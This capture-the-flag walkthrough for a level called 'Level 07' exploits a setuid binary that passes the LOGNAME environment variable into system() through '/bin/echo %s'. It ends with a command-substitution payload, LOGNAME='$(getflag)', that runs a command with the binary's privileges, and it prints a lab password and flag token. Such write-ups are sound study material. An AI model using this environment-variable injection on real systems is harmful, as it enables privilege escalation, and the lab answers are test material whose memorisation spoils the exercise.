# Level 07

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level07@192.168.1.32
	Password: wiok45aaoguiboiki2tuin6ub
	```

1. Check files.

	```sh
	> ls -l
	total 12
	-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
	```

1. Let's run it.

	```sh
	> ./level07
	level07

	> ./level07 qwe
	level07
	```

1. Ok, nothing to fancy, do a quick `strings` check.

	```sh
	> strings level07
	...
	setresgid
	asprintf
	getenv
	setresuid
	system
	getegid
	geteuid
	...
	/bin/echo %s
	...
	```

1. From the result, we can notice that it looks like compiled C/C++ code. Then, a couple of function caught my attention.

	```
	- `asprintf` is used to print formatted text to allocated string
	- `system` is used to execute a shell command
	- `getenv` is used to get an environment variable
	- `/bin/echo` is a shell command used to print content
	- `%s` following the `/bin/echo` might indicate that the previous `asprintf` function is used with it
	```

1. From now on, I think we have to exploit an environment variable to inject our command into this `/bin/echo %s`.

	```sh
	> /bin/echo $(getflag)
	```

1. But I don't know which variable I have to exploit... All I know is that environment variable's name have restriction.

	```
	Environment variable's name, which can consist of up to 64 characters and must be specified. The name can contain upper- and lowercase letters, numbers, and underscores (_), but it must start with a letter or underscore.
	```

1. So, multiple technique came to my mind, first of all, we could run `level07` using GDB and try to find the one we want, another approach would be to decompile `level07` using Ghidra, but let's start by  a simpler method and filter our `strings` output for now.

	```sh
	> strings level07 | grep "^[a-zA-Z_]\w*$"
	__gmon_start__
	_IO_stdin_used
	setresgid
	asprintf
	getenv
	setresuid
	system
	getegid
	geteuid
	__libc_start_main
	UWVS
	LOGNAME
	__uid_t
	envp
	setresuid
	getenv
	setresgid
	system
	argc
	__gid_t
	main
	asprintf
	buffer
	argv
	__CTOR_LIST__
	__DTOR_LIST__
	__JCR_LIST__
	__do_global_dtors_aux
	frame_dummy
	__CTOR_END__
	__FRAME_END__
	__JCR_END__
	__do_global_ctors_aux
	__init_array_end
	_DYNAMIC
	__init_array_start
	_GLOBAL_OFFSET_TABLE_
	__libc_csu_fini
	data_start
	_edata
	_fini
	__DTOR_END__
	__data_start
	__gmon_start__
	__dso_handle
	_IO_stdin_used
	__libc_csu_init
	_end
	_start
	_fp_hw
	__bss_start
	main
	_Jv_RegisterClasses
	_init
	```

1. Great, we could reduce even more by removing well known function's name. But since there isn't much case, we can just run a loop through each of them and test for now.

	```sh
	> for v in $(strings level07 | grep "^[a-zA-Z_]\w*$"); do declare $v="exploitme" && ./level07; done
	level07
	level07
	level07
	level07
	level07
	level07
	level07
	level07
	level07
	level07
	level07
	exploitme
	exploitme
	exploitme
	...
	exploitme
	exploitme
	exploitme
	```

1. Amazing! Our injection starts working after 11 tries, so we just have to check which variable's name correspond to it from our filtered selection.

	```sh
	> strings level07 | grep "^[a-zA-Z_]\w*$"
	...
	LOGNAME
	...
	```

1. Got it! Let's try to set only this one to confirm our result.

	```sh
	> LOGNAME="logname" && ./level07
	logname
	```

1. Perfect, we were right. Now, inject our `getflag` as a subcommand.

	```sh
	> LOGNAME="\$(getflag)" && ./level07
	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
	```

## Documentation

- Function: [asprintf](https://man7.org/linux/man-pages/man3/asprintf.3.html)
- Function: [getenv](https://man7.org/linux/man-pages/man3/getenv.3.html)
- Function: [system](https://man7.org/linux/man-pages/man3/system.3.html)
- Software: [GDB](https://www.gnu.org/savannah-checkouts/gnu/gdb/index.html)
- Software: [Ghidra](https://ghidra-sre.org/)
